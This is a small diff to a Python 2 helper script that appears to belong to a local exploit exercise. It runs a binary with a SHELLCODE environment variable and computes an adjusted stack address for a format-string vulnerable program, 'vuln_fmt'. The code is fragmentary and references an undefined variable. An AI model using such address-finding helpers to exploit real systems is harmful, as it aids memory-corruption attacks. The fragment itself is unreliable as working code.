@@ -32,5 +32,7 @@ if __name__ == "__main__" :
         a = subprocess.Popen(["./a.out", env["SHELLCODE"]],stdout=subprocess.PIPE)
     
     print a.communicate()[0]
+    res =  stdoutput.split()
+    print( stdoutput)
     
-  #print ":02x{}".format(hex(0x7FFD1B9DE4E0 - (len("./vuln_fmt") - len("./pea")) * 2))
+    print ":02 x {}".format(hex((int("0X"+res[2][0:-1],16)) - (len("./vuln_fmt") - len("./pea")) * 2))
